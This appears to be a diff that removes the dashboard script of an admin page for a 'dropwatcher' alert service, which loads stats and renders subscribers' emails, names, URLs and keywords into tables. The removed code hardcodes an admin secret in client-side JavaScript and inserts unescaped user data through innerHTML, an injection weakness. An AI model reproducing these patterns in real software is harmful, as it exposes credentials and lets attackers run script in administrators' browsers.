-  return active
-    ? '<span class="badge badge-active">Active</span>'
-    : '<span class="badge badge-pending">Pending</span>';
-}
-
-async function loadStats() {
-  try {
-    const r = await fetch('/api/stats');
-    const d = await r.json();
-    document.getElementById('statDrops24').textContent = d.drops_24h || 0;
-    document.getElementById('statCrit').textContent = d.critical_24h || 0;
-    document.getElementById('statDropsTotal').textContent = d.drops_total || 0;
-    const dropEl = document.getElementById('sysLatestDrop');
-    const dropText = d.latest_drop ? timeAgo(d.latest_drop) : 'none';
-    dropEl.innerHTML = d.latest_drop ? '<a href="/alerts.html" style="color:inherit;text-decoration:underline;text-decoration-color:var(--flame)">' + dropText + '</a>' : dropText;
-    dropEl.className = 'sys-value ' + (d.latest_drop ? 'ok' : 'warn');
-    document.getElementById('sysPreflight').textContent = d.last_preflight ? timeAgo(d.last_preflight) : 'unknown';
-    document.getElementById('sysWatchdog').textContent = d.last_watchdog || 'unknown';
-
-    const failures = d.watchdog_failures || {};
-    const failCount = Object.values(failures).filter(v => v > 0).length;
-    document.getElementById('sysFailures').textContent = failCount === 0 ? 'none' : JSON.stringify(failures);
-    document.getElementById('sysFailures').className = 'sys-value ' + (failCount === 0 ? 'ok' : 'bad');
-  } catch (e) {
-    console.error('Stats failed:', e);
-  }
-}
-
-async function loadWatchers() {
-  try {
-    const r = await fetch('/api/watchers', {headers: {'X-Admin-Secret': 'dropwatcher-admin-2026'}});
-    if (r.status === 403) {
-      document.getElementById('watchersBody').innerHTML = '<tr><td colspan="9" class="error">403 — Not authorized (IP not allowed)</td></tr>';
-      return;
-    }
-    const d = await r.json();
-
-    document.getElementById('statTotal').textContent = d.total || 0;
-    document.getElementById('statActive').textContent = d.active_count || 0;
-    document.getElementById('statPending').textContent = d.pending_count || 0;
-    document.getElementById('statEmails').textContent = d.unique_emails || 0;
-
-    const smsCount = (d.watchers || []).filter(w => w.phone).length;
-    document.getElementById('statSMS').textContent = smsCount;
-
-    const watchers = d.watchers || [];
-    if (watchers.length === 0) {
-      document.getElementById('watchersBody').innerHTML = '<tr><td colspan="9" class="loading">No watchers yet</td></tr>';
-      return;
-    }
-
-    // Sort: active first, then by created desc
-    watchers.sort((a, b) => {
-      if (a.active !== b.active) return a.active ? -1 : 1;
-      return (b.created || '').localeCompare(a.created || '');
-    });
-
-    const rows = watchers.map(w => {
-      const domain = (w.url || '').replace(/^https?:\/\/(www\.)?/, '').split('/')[0];
-      return '<tr>' +
-        '<td>' + statusBadge(w.active) + '</td>' +
-        '<td>' + (w.email || '') + '</td>' +
-        '<td>' + (w.name || '—') + '</td>' +
-        '<td class="url-cell" title="' + (w.url || '') + '"><a href="' + (w.url || '') + '" target="_blank">' + domain + '</a></td>' +
-        '<td class="kw-cell" title="' + (w.keywords || '') + '">' + (w.keywords || '') + '</td>' +
-        '<td>' + priorityBadge(w.priority) + '</td>' +
-        '<td>' + (w.alert_count || 0) + '</td>' +
-        '<td>' + (w.phone ? '&#x2713;' : '') + '</td>' +
-        '<td>' + shortDate(w.created) + '</td>' +
-        '</tr>';
-    }).join('');
-
-    document.getElementById('watchersBody').innerHTML = rows;
-  } catch (e) {
-    document.getElementById('watchersBody').innerHTML = '<tr><td colspan="9" class="error">Failed to load: ' + e.message + '</td></tr>';
-  }
-}
-
-function loadAll() {
-  document.getElementById('lastRefresh').textContent = 'Refreshing...';
-  Promise.all([loadStats(), loadWatchers()]).then(() => {
-    document.getElementById('lastRefresh').textContent = 'Last refresh: ' + new Date().toLocaleTimeString();
-  });
-}
-
-loadAll();
-// Auto-refresh every 60 seconds
-setInterval(loadAll, 60000);
-</script>
 
 </body>
 </html>
